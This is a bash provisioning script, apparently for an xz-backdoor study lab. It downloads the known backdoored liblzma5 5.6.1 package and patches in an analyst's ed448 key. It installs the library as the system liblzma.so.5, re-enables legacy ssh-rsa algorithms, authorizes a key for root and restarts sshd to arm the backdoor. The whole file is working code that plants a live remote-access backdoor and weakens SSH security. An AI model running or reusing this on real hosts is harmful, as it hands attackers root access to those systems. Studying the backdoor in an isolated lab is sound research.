#!/usr/bin/env bash
# provision/provision-compromised.sh — GUEST-SIDE (compromised VM). ONLINE phase.
#
# Turns this VM's NATIVE sshd into a genuinely backdoored one (no Docker):
#   - download liblzma5 5.6.1-1 (amd64), verify it against its IOC hash
#   - patch in ANALYST's ed448 public key (so only the analyst can trigger it)
#   - install it as the system liblzma.so.5 (sshd -> libsystemd -> liblzma)
#   - configure sshd for the legacy ssh-rsa cert path + an RSA-only host key
#     (OpenSSH disables these by default; without them the backdoor is unreachable)
#   - authorize the analyst's SSH key, then restart sshd so it loads the backdoor
#
# Inputs pushed by the host into keys/: analyst-pubkey.hex, analyst-ssh.pub
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "${HERE}/.." && pwd)"
# shellcheck source=common/lib.sh
source "${ROOT}/../common/lib.sh"

LIBLZMA_URL="https://snapshot.debian.org/file/81f1f56c590eee24bc320293f2c5c508fcb55d02"
WORK="${ROOT}/.work"; KEYS="${ROOT}/keys"
ensure_dir "$WORK"

PUBKEY_FILE="${KEYS}/analyst-pubkey.hex"
SSHPUB_FILE="${KEYS}/analyst-ssh.pub"
[[ -f "$PUBKEY_FILE" ]] || die "Missing analyst ed448 pubkey at $PUBKEY_FILE"
[[ -f "$SSHPUB_FILE" ]] || die "Missing analyst SSH pubkey at $SSHPUB_FILE"
PUBKEY="$(tr -d ' \n' < "$PUBKEY_FILE")"

log_step "compromised: tooling (python3 for patch, ar for deb, curl)"
if ! have_cmd ar || ! have_cmd python3; then
  sudo apt-get update -y
  sudo apt-get install -y --no-install-recommends binutils python3 ca-certificates curl
fi

log_step "compromised: download backdoored liblzma5 5.6.1-1 and verify IOC"
DEB="${WORK}/liblzma5_5.6.1-1_amd64.deb"; SO="${WORK}/liblzma.so.5.6.1"
if [[ ! -f "$SO" ]]; then
  curl -fsSL --max-time 180 -o "$DEB" "$LIBLZMA_URL" || die "liblzma download failed."
  rm -rf "${WORK}/debx"; mkdir -p "${WORK}/debx"
  ( cd "${WORK}/debx" && ar x "$DEB" && tar -xf data.tar.* )
  cp "$(find "${WORK}/debx" -name 'liblzma.so.5.6.1' | head -1)" "$SO"
fi
verify_against_iocs "$SO"   # aborts unless == 605861f833...

log_step "compromised: patch ANALYST's ed448 public key into liblzma"
python3 "${ROOT}/patch_key.py" "$SO" "$PUBKEY"
PATCHED="${SO}.patch"
[[ -f "$PATCHED" ]] || die "patch_key.py produced no output."

log_step "compromised: install patched liblzma as the system liblzma.so.5"
LIBDIR=/usr/lib/x86_64-linux-gnu
sudo cp "$PATCHED" "${LIBDIR}/liblzma.so.5.6.1"
sudo ln -sf liblzma.so.5.6.1 "${LIBDIR}/liblzma.so.5"
sudo ldconfig
log_ok "system liblzma.so.5 -> $(readlink "${LIBDIR}/liblzma.so.5")"

log_step "compromised: configure native sshd for the backdoor-reachable cert path"
sudo cp -n /etc/ssh/sshd_config /etc/ssh/sshd_config.orig 2>/dev/null || true
sudo tee /etc/ssh/sshd_config.d/10-xzlab.conf >/dev/null <<'CFG'
# Lab: make the xz backdoor reachable on this host.
# The backdoor is only hit via the legacy ssh-rsa certificate path that calls
# RSA_public_decrypt, and it binds its trigger signature to the RSA host key.
# Modern OpenSSH disables ssh-rsa and prefers ECDSA/ed25519 host keys, so we
# re-enable the former and force an RSA-only host key.
HostKey /etc/ssh/ssh_host_rsa_key
HostKeyAlgorithms ssh-rsa,rsa-sha2-256,rsa-sha2-512
PubkeyAcceptedAlgorithms +ssh-rsa,ssh-rsa-cert-v01@openssh.com,ssh-ed25519
CASignatureAlgorithms +ssh-rsa
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PasswordAuthentication no
LogLevel VERBOSE
CFG

log_step "compromised: authorize the analyst's SSH key for root"
sudo mkdir -p /root/.ssh && sudo chmod 700 /root/.ssh
sudo cp "$SSHPUB_FILE" /root/.ssh/authorized_keys
sudo chmod 600 /root/.ssh/authorized_keys

log_step "compromised: validate config and restart sshd (loads the backdoor)"
sudo sshd -t || die "sshd config invalid — refusing to restart."
sudo systemctl restart ssh
sleep 1
# Confirm the backdoored liblzma is mapped into the new sshd.
spid="$(pidof sshd | awk '{print $1}')"
if sudo grep -q 'liblzma.so.5.6.1' "/proc/${spid}/maps" 2>/dev/null; then
  log_ok "Backdoored liblzma is loaded into sshd (pid ${spid}). Host is armed."
else
  log_warn "Could not confirm liblzma mapping in sshd; check manually."
fi
